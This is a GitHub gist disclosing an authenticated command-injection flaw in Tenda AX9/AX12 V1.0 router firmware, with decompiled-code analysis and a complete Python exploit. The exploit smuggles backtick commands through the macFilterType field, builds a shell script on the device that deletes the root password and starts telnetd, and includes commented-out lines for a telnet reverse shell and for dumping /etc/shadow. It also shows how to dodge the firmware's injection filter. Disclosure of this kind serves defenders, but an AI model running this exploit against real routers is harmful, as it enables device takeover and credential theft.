=== Content from gist.github.com_203c25ad_20250111_193736.html ===

[Skip to content](#start-of-content)

[All gists](/discover)
[Back to GitHub](https://github.com)
[Sign in](https://gist.github.com/auth/github?return_to=https%3A%2F%2Fgist.github.com%2FSwind1er%2Fc8e4369c7fdfd750c8ad01a276105c57)
[Sign up](/join?return_to=https%3A%2F%2Fgist.github.com%2FSwind1er%2Fc8e4369c7fdfd750c8ad01a276105c57&source=header-gist)

[Sign in](https://gist.github.com/auth/github?return_to=https%3A%2F%2Fgist.github.com%2FSwind1er%2Fc8e4369c7fdfd750c8ad01a276105c57) [Sign up](/join?return_to=https%3A%2F%2Fgist.github.com%2FSwind1er%2Fc8e4369c7fdfd750c8ad01a276105c57&source=header-gist)

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

Instantly share code, notes, and snippets.

[![@Swind1er](https://avatars.githubusercontent.com/u/100978844?s=64&v=4)](/Swind1er)

# [Swind1er](/Swind1er)/**[tenda-AX9-AX12\_V1.0-setMacFilterCfg\_Command\_Execution\_Vulnerability\_PoC.md](/Swind1er/c8e4369c7fdfd750c8ad01a276105c57)**

Last active
August 4, 2024 08:06

Show Gist options

* [Download ZIP](/Swind1er/c8e4369c7fdfd750c8ad01a276105c57/archive/f9139ac9ca18aac5e9a21664c5dd454fa4ad5a98.zip)

* [Star
  (0)
  0](/login?return_to=https%3A%2F%2Fgist.github.com%2FSwind1er%2Fc8e4369c7fdfd750c8ad01a276105c57)You must be signed in to star a gist
* [Fork
  (1)
  1](/login?return_to=https%3A%2F%2Fgist.github.com%2FSwind1er%2Fc8e4369c7fdfd750c8ad01a276105c57)You must be signed in to fork a gist

* Embed

  + Embed
     Embed this gist in your website.
  + Share
     Copy sharable link for this gist.
  + Clone via HTTPS
     Clone using the web URL.
  + [Learn more about clone URLs](https://docs.github.com/articles/which-remote-url-should-i-use)

  Clone this repository at &lt;script src=&quot;https://gist.github.com/Swind1er/c8e4369c7fdfd750c8ad01a276105c57.js&quot;&gt;&lt;/script&gt;
* Save Swind1er/c8e4369c7fdfd750c8ad01a276105c57 to your computer and use it in GitHub Desktop.

[Code](/Swind1er/c8e4369c7fdfd750c8ad01a276105c57)
[Revisions
2](/Swind1er/c8e4369c7fdfd750c8ad01a276105c57/revisions)
[Forks
1](/Swind1er/c8e4369c7fdfd750c8ad01a276105c57/forks)

Embed

* Embed
   Embed this gist in your website.
* Share
   Copy sharable link for this gist.
* Clone via HTTPS
   Clone using the web URL.
* [Learn more about clone URLs](https://docs.github.com/articles/which-remote-url-should-i-use)

Clone this repository at &lt;script src=&quot;https://gist.github.com/Swind1er/c8e4369c7fdfd750c8ad01a276105c57.js&quot;&gt;&lt;/script&gt;

Save Swind1er/c8e4369c7fdfd750c8ad01a276105c57 to your computer and use it in GitHub Desktop.

[Download ZIP](/Swind1er/c8e4369c7fdfd750c8ad01a276105c57/archive/f9139ac9ca18aac5e9a21664c5dd454fa4ad5a98.zip)

 [Raw](/Swind1er/c8e4369c7fdfd750c8ad01a276105c57/raw/f9139ac9ca18aac5e9a21664c5dd454fa4ad5a98/tenda-AX9-AX12_V1.0-setMacFilterCfg_Command_Execution_Vulnerability_PoC.md)

[**tenda-AX9-AX12\_V1.0-setMacFilterCfg\_Command\_Execution\_Vulnerability\_PoC.md**](#file-tenda-ax9-ax12_v1-0-setmacfiltercfg_command_execution_vulnerability_poc-md)

# tenda-AX9-AX12 V1.0-setMacFilterCfg Command Execution Vulnerability PoC

## Official website of the vendor

[腾达(Tenda)官方网站](https://www.tenda.com.cn/default.html)

## Affected device models

AX3000 Dual-Band Gigabit Wi-Fi 6 Router AX9

AX3000 Dual-Band Gigabit Wi-Fi 6 Router AX12 V1.0

## Affected firmware versions

[[AX9 升级软件 V22.03.01.46]](https://static.tenda.com.cn/tdcweb/download/uploadfile/AX9/AX9V1.0in_V22.03.01.46.zip)

[AX12 升级软件 V22.03.01.46](https://static.tenda.com.cn/tdcweb/download/uploadfile/AX12/V22.03.01.46.zip)

## Vulnerability Type

[RCE] Authorized Remote Command Execution

## Vulnerability Description

In the latest firmware of Shenzhen Jixiang Tengda Technology Co., Ltd.'s AX9 and AX12 V1.0 routers, there exists an authorized command execution vulnerability. The web server in the firmware's file system processes the `/goform/setMacFilterCfg` request without filtering the content of the incoming `macFilterType` string. This allows an attacker to write a restricted number of illegal characters into the file system under the `macFilterType` field, leading to arbitrary command execution.

## Make your life simpler

<https://github.com/Swind1er/Video/raw/main/tenda-AX9-AX12%20V1.0-setMacFilterCfg-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9Evideo-en.mp4>

## Vulnerability Analysis

First, locate the corresponding handling function for the `/goform/setMacFilterCfg` CGI request, RVA: `0x0042F69C`. Here is a simplified excerpt of the key code:

```
int __fastcall setMacFilterCfg_cgi(int a1)
{
  macFilterType = webGetVar(a1, (int)"macFilterType", 0x45857C);
  deviceList = webGetVar(a1, (int)"deviceList", 0x45857C);

  tapi_get_mf_cfg(sub_42E2F0, buf);
  tapi_get_mf_rules((int)sub_42E738, (int)buf);
  tapi_clear_mf_cfg();
  ****
LABEL_4:
  sub_42E3C0(v15, 3, macFilterType);
  tapi_set_mf_cfg(v15[0]);
  blob_buf_free(v15);
  printf("old_type:%s new_type:%s\n", (const char *)&buf[2], macFilterType);
  if ( strcmp(macFilterType, &buf[2]) )
    doSystemCmd("echo %s >/tmp/macfilter", (const char *)&buf[2]);
  tapi_set_mf_rule(v14[0]);
  blob_buf_free(v14);

  return _stack_chk_guard;
}
```

You can see that for the incoming `macFilterType` field, the `httpd` server does not reliably check its validity and instead directly calls `tapi_set_mf_cfg` to write to it. Pay attention to the following code:

```
if ( strcmp(macFilterType, &buf[2]) )
    doSystemCmd("echo %s >/tmp/macfilter", (const char *)&buf[2]);
```

The contents of the `buf` buffer are obtained by calling `tapi_get_mf_cfg(sub_42E2F0, buf);`. `buf[2]` points to the `macFilterType` string before any writing occurs. By comparing the intended content of `macFilterType` with its current content, if they are not equal, `doSystemCmd` is executed. It's evident that this command can be maliciously constructed. If we pre-write malicious instructions into the file system (via `/goform/setMacFilterCfg`), and then submit a different `macFilterType`, our written instructions will be executed through `doSystemCmd`.

To continue tracking the write operation of the `macFilterType` field into the file system, we follow the function `tapi_set_mf_cfg`, which is implemented in `\bin\td_serverd` at RVA `0x0040ABDC`, as follows:

```
unsigned int __fastcall set_mf_cfg_handler(int a1)
{
***
  if ( v6 )
  {
    memset(v11, 0, sizeof(v11));
    if ( (unsigned int)(strlen(v6 + 4) + 1) >= 17 )
      __trap(0u);
    strcpy(v11, v6 + 4);
    SetValue("macfilter.macfilter.type", v11);
    v2 = strcmp(v11, "black") != 0;
    macfilter_enable(v2);
    td_printf(3, (int)"set_mf_cfg", 0xE8, "RULE_MF_TYPE\n");
  }
  CfgCommit("macfilter");
  return 0;
}
```

It can be observed that the `macFilterType` field we pass in cannot exceed or be equal to 17 bytes in length, which is quite exploitable. A relatively straightforward exploitation method is to use `printf` to write a malicious script into the file system, use `chmod` to grant permissions, and then further execute the script using `exec`, as detailed in the exploit.

The next step is to check whether `doSystemCmd` performs parameter checking. Its specific implementation is in `\usr\lib\libsyschk.so`, as follows:

[![image-20240623105454295](https://camo.githubusercontent.com/6ae16fd5eab9cb841d6df7835f88b8d9823de97c9a1c6d1a577c4ac8125c559c/68747470733a2f2f67697465652e636f6d2f445f696f6e797375732f636c6f7564696d6167652f7261772f6d61737465722f696d672f3230323430363233313035353338362e706e67)](https://camo.githubusercontent.com/6ae16fd5eab9cb841d6df7835f88b8d9823de97c9a1c6d1a577c4ac8125c559c/68747470733a2f2f67697465652e636f6d2f445f696f6e797375732f636c6f7564696d6167652f7261772f6d61737465722f696d672f3230323430363233313035353338362e706e67)

After a simple format string vulnerability test, continuing to trace `sub_CD44`, it can be found that an injection test check was performed:

[![image-20240623105546749](https://camo.githubusercontent.com/d7acc05d44682f754547536f70839a3c1f05f8f2277b9b9a5340c014ce4b7566/68747470733a2f2f67697465652e636f6d2f445f696f6e797375732f636c6f7564696d6167652f7261772f6d61737465722f696d672f3230323430363233313035353830372e706e67)](https://camo.githubusercontent.com/d7acc05d44682f754547536f70839a3c1f05f8f2277b9b9a5340c014ce4b7566/68747470733a2f2f67697465652e636f6d2f445f696f6e797375732f636c6f7564696d6167652f7261772f6d61737465722f696d672f3230323430363233313035353830372e706e67)

The specific implementation of the `os_cmd_injection_test` function is in `\usr\lib\libcommon.so` as follows:

[![image-20240623105709969](https://camo.githubusercontent.com/d18ba54c47aa229bcc121a9be755453dbeb54a9af83a721f9ea8c2101f87c4c7/68747470733a2f2f67697465652e636f6d2f445f696f6e797375732f636c6f7564696d6167652f7261772f6d61737465722f696d672f3230323430363233313035373034302e706e67)](https://camo.githubusercontent.com/d18ba54c47aa229bcc121a9be755453dbeb54a9af83a721f9ea8c2101f87c4c7/68747470733a2f2f67697465652e636f6d2f445f696f6e797375732f636c6f7564696d6167652f7261772f6d61737465722f696d672f3230323430363233313035373034302e706e67)

It can be seen that the command injection check proceeds further only if the string contains the `liuguizhou` and `telnetd` fields. Avoiding these two strings will bypass the command injection detection.

## EXP

The script will delete the root user's password embedded in the firmware system and enable telnetd. After the script executes, you can connect using telnet. Please refer to the vulnerability exploitation validation video for details.

```
import requests
import logging
import argparse
import hashlib
import time
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import base64
import urllib.parse
__author__ = "Yaxuan Wang(Sw1ndl3r)"
__email__ = "2532775668@qq.com"

logging.basicConfig(level=logging.DEBUG)

global_stok = None
global_sign = None
gloabl_iv = "EU5H62G9ICGRNI43"

def get_current_timestamp():
    return str(int(time.time()))

def aes_cbc_pkcs7_encrypt(data, key_utf8, iv_utf8):
    key = key_utf8.encode('utf-8')
    iv = iv_utf8.encode('utf-8')

    cipher = AES.new(key, AES.MODE_CBC, iv)
    padded_data = pad(data, AES.block_size)
    encrypted_data = base64.b64encode(cipher.encrypt(padded_data))

    return encrypted_data

def aes_cbc_pkcs7_decrypt(encrypted_data, key_utf8, iv_utf8):
    key = key_utf8.encode('utf-8')
    iv = iv_utf8.encode('utf-8')

    cipher = AES.new(key, AES.MODE_CBC, iv)
    decrypted_data = cipher.decrypt(encrypted_data)
    unpadded_data = unpad(decrypted_data, AES.block_size)

    return unpadded_data

def hash_password(password):
    hashed = hashlib.md5(password.encode()).hexdigest()
    return hashed

def send_login_request(session, host_ip, username, password):
    url = f"http://{host_ip}/login/Auth"

    headers = {
        "Host": host_ip,
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "X-Requested-With": "XMLHttpRequest",
        "Origin": f"http://{host_ip}",
        "Connection": "close",
        "Referer": f"http://{host_ip}/login.html",
        #"Cookie": f"_:USERNAME:_=744087468a6b394609816ed264b01543  password=21232f297a57a5a743894a0e4a801fc3xkzded"
    }

    payload = {
        "username": username,
        "password": password
    }

    response = session.post(url, headers=headers, data=payload)

    return response

def send_stokCfg_request(session, host_ip):
    url = f"http://{host_ip}/goform/stokCfg?0.481083665320881"

    headers = {
        "Host": host_ip,
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate",
        "X-Requested-With": "XMLHttpRequest",
        "Connection": "close",
        "Referer": f"http://{host_ip}/main.html",
        "Pragma": "no-cache",
        "Cache-Control": "no-cache"
    }

    response = session.get(url, headers=headers)

    if response.status_code == 200:
        logging.debug(f"GET Request successful. Response: {response.text}")

        try:
            json_response = response.json()
            if 'stokCfg' in json_response:
                global global_stok, global_sign
                stok_cfg = json_response['stokCfg']
                global_stok = stok_cfg.get('stok')
                global_sign = stok_cfg.get('sign')
                logging.info(f"Extracted stok: {global_stok}, sign: {global_sign}")
            else:
                logging.error("Response format error: 'stokCfg' field not found.")
        except ValueError as ve:
            logging.error(f"Error decoding JSON response: {ve}")
    else:
        logging.error(f"GET Request failed with status code: {response.status_code}")
        logging.error(f"Response: {response.text}")

def send_mac_filter_request(session, host_ip, encrypted_data):
    url = f"http://{host_ip}/goform/setMacFilterCfg"

    headers = {
        "Host": host_ip,
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "X-Requested-With": "XMLHttpRequest",
        "Origin": f"http://{host_ip}",
        "Connection": "close",
        "Referer": f"http://{host_ip}/mac_filter.html?random=0.2746779239834576&",
        "Pragma": "no-cache",
        "Cache-Control": "no-cache"
    }

    response = session.post(url, headers=headers, data=encrypted_data)

    if response.status_code == 200:
        logging.info("POST Request to set MAC filter config sent successfully.")
        #logging.debug(f"Response: {response.text}")
    else:
        logging.error(f"POST Request failed with status code: {response.status_code}")
        logging.error(f"Response: {response.text}")

def main():
    session = requests.session()

    parser = argparse.ArgumentParser(description='tenda-AX9-AX12_AX9V1.0in_V22.03.01.46-setMacFilterCfg-RCE EXP')
    parser.add_argument('-H', '--host', metavar='host', default='192.168.0.1', help='Router IP address.')
    parser.add_argument('-U', '--username', metavar='Username', required=True, help='Login username.')
    parser.add_argument('-P', '--password', metavar='Password', required=True, help='Login password.')
    args = parser.parse_args()

    logging.info(f'Author: {__author__}, email: {__email__}')
    logging.info(f'Host IP: {args.host}')

    hashed_password = hash_password(args.password)

    # Send login request
    response = send_login_request(session, args.host, args.username, hashed_password)
    if response.status_code == 200:
        logging.info("Login request sent successfully.")
        time.sleep(1)

        send_stokCfg_request(session, args.host)

        data_static = "macFilterType=black&deviceList=jdsfs\r10:10:10:10:10:10"
        encrypted_data_static = aes_cbc_pkcs7_encrypt(bytes(data_static,'utf-8'), global_sign, gloabl_iv)

        #cmd = f"##!/bin/sh\n(telnet {args.client} {args.port1} | sh | telnet {args.client} {args.port2}) \n"
        #cmd = f"##!/bin/sh\n telnet {args.client} {args.port1} | sh | telnet {args.client} {args.port2} \n"
        #cmd = f"##!/bin/sh\n cat /etc/shadow >/www/shadow.txt \n"
        #cmd = f"##!/bin/sh\ntelnetd\n"
        cmd = f"##!/bin/sh\npasswd -d root\ntelnetd"
        data = ""

        data = "macFilterType=`rm ./1`&deviceList=jdsfs\r10:10:10:10:10:10"
        encrypted_data = aes_cbc_pkcs7_encrypt(bytes(data,'utf-8'), global_sign, gloabl_iv)
        send_mac_filter_request(session, args.host, encrypted_data)
        time.sleep(0.5)
        send_mac_filter_request(session, args.host, encrypted_data_static)

        for char in cmd:
            data += f"macFilterType=`printf \"{char}\">>1`&deviceList=jdsfs\r10:10:10:10:10:10"

            send_mac_filter_request(session, args.host, encrypted_data_static)
            time.sleep(0.2)
            encrypted_data = aes_cbc_pkcs7_encrypt(bytes(data,'utf-8'), global_sign, gloabl_iv)
            send_mac_filter_request(session, args.host, encrypted_data)
            time.sleep(0.2)
            data = ""

        data = "macFilterType=`chmod 777 ./*`&deviceList=jdsfs\r10:10:10:10:10:10"
        encrypted_data = aes_cbc_pkcs7_encrypt(bytes(data,'utf-8'), global_sign, gloabl_iv)
        send_mac_filter_request(session, args.host, encrypted_data)
        time.sleep(0.2)
        send_mac_filter_request(session, args.host, encrypted_data_static)
        time.sleep(0.2)
        data = "macFilterType=` ./1 `&deviceList=jdsfs\r10:10:10:10:10:10"
        encrypted_data = aes_cbc_pkcs7_encrypt(bytes(data,'utf-8'), global_sign, gloabl_iv)
        send_mac_filter_request(session, args.host, encrypted_data)
        time.sleep(0.2)
        send_mac_filter_request(session, args.host, encrypted_data_static)

    else:
        logging.error("Failed to send login request.")
        logging.error(f"Status code: {response.status_code}")
        logging.error(f"Response: {response.text}")

if __name__ == "__main__":
    main()
//python ./exp.py -H 192.168.0.1  -U admin -P adminadmin
```

[Sign up for free](/join?source=comment-gist)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgist.github.com%2FSwind1er%2Fc8e4369c7fdfd750c8ad01a276105c57)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


